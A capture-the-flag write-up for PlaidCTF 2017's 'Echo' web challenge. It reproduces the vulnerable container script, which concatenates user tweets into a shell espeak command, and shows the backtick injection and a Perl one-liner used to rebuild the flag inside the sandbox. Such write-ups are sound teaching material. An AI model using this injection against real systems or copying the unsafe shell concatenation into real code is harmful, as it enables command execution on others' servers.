---
title: "PlaidCTF 2017 - Echo (web 200) Writeup"
slug: "plaidctf-2017-echo-web-200-writeup"
date: "2017-04-23 18:31:40.265798"
author_name: "tecknicaltom"
author_email: "tecknicaltom@neg9.org"
draft: false
toc: false
images:
---

This challenge presents a webpage with the text "Tweets are 140 characters only!" and input boxes for four tweets. Submitting tweets gives you a page with wav files, one per tweet that contains a text to speech version of the tweet.

The source code for the web front-end was provided. Examining it, you see that the tweets are written to a file:

```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=85}
     with open(my_path + "input" ,"w") as f:
         f.write('\n'.join(tweets))

```

Also, a flag is expanded and written to a file. This creates a large file (65000b per character of the flag) that needs to be acquired completely to get the flag.


```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=25}
def process_flag (outfile):
    with open(outfile,'w') as f:
        for x in flag:
            c = 0
            towrite = ''
            for i in range(65000 - 1):
                k = random.randint(0,127)
                c = c ^ k
                towrite += chr(k)

            f.write(towrite + chr(c ^ ord(x)))
    return

```

Both of these files are passed to a docker container:

```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=10}
docker_cmd = "docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"
```

```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=94}
   subprocess.call(docker_cmd.format(path=my_path).split())
```

Finally, the dockerized process must generate the wav files, because they're then converted back in our python code:

```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=11}
convert_cmd = "ffmpeg -i {in_path} -codec:a libmp3lame -qscale:a 2 {out_path}"
```

```python {title="echo_57f0dd57961caae2fd8b3c080f0e125b.py",linenos=table,linenostart=43}
    for i in range(n):
        st = os.stat(path + str(i+1) + ".wav")
        if st.st_size < 5242880:
            subprocess.call (convert_cmd.format(in_path=path + str(i+1) + ".wav",
                                         out_path=target_path + str(i+1) + ".wav").split())
```

So, first step is to get the run.py that is executed in docker. I chose to extract it from the image without actually creating a container. I'm not very well-versed in Docker, so there may be an easier way to do this:

```bash
docker pull lumjjb/echo_container
docker save lumjjb/echo_container > echo.tar
tar xvf echo.tar
for l in */layer.tar ; do echo $l ; tar tvf $l ; done | less
tar xvf 8f*/layer.tar run.py
```

That gives us:

```python {title="run.py",linenos=table}
import sys
from subprocess import call

import signal
import os
def handler(signum, frame):
    os._exit(-1)

signal.signal(signal.SIGALRM, handler)
signal.alarm(30)


INPUT_FILE="/share/input"
OUTPUT_PATH="/share/out/"

def just_saying (fname):
    with open(fname) as f:
        lines = f.readlines()
        i=0
        for l in lines:
            i += 1

            if i == 5:
                break

            l = l.strip()

            # Do TTS into mp3 file into output path
            call(["sh","-c",
                "espeak " + " -w " + OUTPUT_PATH + str(i) + ".wav \"" + l + "\""])
```

A quick glance at that shows that it's vulnerable to shell injection in the call to espeak. Submitting a tweet with of `\`pwd\`` (using backticks) returns an audio of "slash", confirming.

Since the audio is converted by ffmpeg, we can't just cat the flag file into the output wav files. Instead, I chose to reconstruct the flag within the docker image. After confirming that the docker environment had Perl available, I was off to do some golfing, eventually working up to:

```
perl -e 'local$/;$a=<>;$f[$_/65000]^=ord(substr($a,$_,1))for(0..length($a)-1);print join"-",@f' share/flag
```

This one-liner reconstructs the flag and prints the decimal ASCII values of each character. Manually transcribed from the audio, it gives:

```
80-67-84-70-123-76-49-53-115-116-51-110-95-84-48-95-95-114-101-101-101-95-114-101-101-101-101-101-101-95-114-101-101-101-95-108-97-125
```

which decodes to:

```
PCTF{L15st3n_T0__reee_reeeeee_reee_la}
```
